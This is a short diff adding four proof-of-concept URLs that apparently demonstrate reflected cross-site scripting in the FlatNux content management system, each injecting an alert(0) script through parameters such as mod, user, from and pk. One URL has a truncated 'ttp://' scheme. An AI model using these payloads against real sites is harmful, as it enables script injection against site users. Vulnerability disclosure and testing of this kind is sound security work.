@@ -1,0 +1,4 @@
+http://www.example.com/flatnux/index.php?mod=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+http://www.example.com/flatnux/index.php?mod=login&amp;op=profile&amp;user=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+http://www.example.com/flatnux/index.php?opindex=modcont&amp;file=misc/motd.en.php&amp;from=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+ttp://www.example.com/flatnux/controlcenter.php?mod=controlcenter&amp;op=03_users/20_groups&amp;opmod=insnew_groups&amp;pk=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
